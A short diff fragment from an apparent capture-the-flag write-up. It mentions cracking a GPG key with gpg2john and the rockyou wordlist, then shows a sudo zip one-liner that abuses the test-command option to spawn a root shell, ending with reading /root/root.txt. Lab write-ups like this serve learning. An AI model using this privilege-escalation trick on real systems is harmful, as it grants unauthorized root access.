@@ -101,7 +101,9 @@ I will use gpg2john to obtain a john crackable file and crack it using rockyou.t
 I'll use what I found:
   
 `sudo zip $(mktemp -u) /etc/hosts -T -TT 'sh #'`
+ 
 `whoami`
+ 
 > root
   
 Now I'm able to cat /root/root.txtand we're done
